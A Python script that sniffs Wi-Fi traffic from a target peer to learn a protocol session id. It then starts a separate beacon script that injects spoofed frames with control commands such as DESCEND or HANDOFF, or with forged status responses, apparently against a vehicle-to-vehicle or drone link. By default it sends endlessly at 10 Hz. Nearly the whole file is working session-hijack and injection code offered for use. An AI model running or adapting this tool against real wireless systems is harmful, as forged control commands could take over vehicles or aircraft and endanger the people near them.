#!/usr/bin/env python3
"""
Auto-learn session id from peer traffic, then run gen-v2v-beaconv2 injection.
"""

from __future__ import annotations

import argparse
import subprocess
import sys
import time

from scapy.all import Dot11, sniff

from tunnel_sniffer import (
    DEFAULT_V2V_KEY_HEX,
    extract_tunnel_parse_result,
    parse_frame_injection_transport,
    parse_rtmp_frame,
    verify_signature,
)


def learn_session_id(
    interface: str,
    peer_mac: str,
    timeout_s: float,
    verify_sig: bool,
    v2v_pubkey_hex: str,
) -> int:
    deadline = None if timeout_s <= 0 else (time.time() + timeout_s)
    peer_mac = peer_mac.lower()
    while deadline is None or time.time() < deadline:
        packets = sniff(iface=interface, timeout=1.0, store=1)
        for pkt in packets:
            if not pkt.haslayer(Dot11):
                continue
            if (pkt.addr2 or "").lower() != peer_mac:
                continue
            try:
                parsed = extract_tunnel_parse_result(pkt)
                if verify_sig:
                    verify_signature(parsed.signature, parsed.signable, v2v_pubkey_hex)
                rtmp = parse_rtmp_frame(parsed.tunnel_data)
                transport = parse_frame_injection_transport(rtmp["transport"])
                return int(transport["session_id"])
            except Exception:
                continue
    raise TimeoutError(f"Timed out waiting to learn session id from {peer_mac}")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Learn session id from peer and inject with gen-v2v-beaconv2"
    )
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--learn-peer-mac", required=True, help="MAC to learn session id from")
    parser.add_argument("--src-mac", required=True)
    parser.add_argument("--dest-mac", required=True)
    parser.add_argument(
        "--timeout",
        type=float,
        default=0.0,
        help="Seconds to wait for session learning (0 or negative = wait forever)",
    )
    parser.add_argument("--no-verify-signature", action="store_true")
    parser.add_argument("--v2v-key-hex", default=DEFAULT_V2V_KEY_HEX)
    parser.add_argument("--beacon-script", default="/root/neo-wireless/gen-v2v-beaconv2.py")
    parser.add_argument("--count", type=int, default=0, help="0 means infinite send")
    parser.add_argument("--rate-hz", type=float, default=10.0)

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("--zmd-command", choices=["DESCEND", "HANDOFF"])
    mode.add_argument("--zmd-response", choices=["IN_PROGRESS", "COMPLETED", "FAILED"])
    parser.add_argument(
        "--response-command",
        choices=["DESCEND", "HANDOFF"],
        default="DESCEND",
        help="Required when using --zmd-response",
    )

    args = parser.parse_args()

    if args.zmd_response and not args.response_command:
        parser.error("--response-command is required with --zmd-response")

    try:
        session_id = learn_session_id(
            interface=args.interface,
            peer_mac=args.learn_peer_mac,
            timeout_s=args.timeout,
            verify_sig=not args.no_verify_signature,
            v2v_pubkey_hex=args.v2v_key_hex,
        )
    except TimeoutError as exc:
        print(f"[AUTO-INJECT] {exc}", file=sys.stderr)
        return 2

    print(f"[AUTO-INJECT] learned session_id={session_id} from {args.learn_peer_mac}")

    cmd = [
        sys.executable,
        args.beacon_script,
        "--src-mac",
        args.src_mac,
        "--dest-mac",
        args.dest_mac,
        "--session-id",
        str(session_id),
        "--send",
        "--interface",
        args.interface,
        "--count",
        str(args.count),
        "--rate-hz",
        str(args.rate_hz),
    ]
    if args.zmd_command:
        cmd += ["--zmd-command", args.zmd_command]
    else:
        cmd += [
            "--zmd-response",
            args.zmd_response,
            "--response-command",
            args.response_command,
        ]

    print("[AUTO-INJECT] launching:", " ".join(cmd))
    return subprocess.call(cmd)


if __name__ == "__main__":
    raise SystemExit(main())
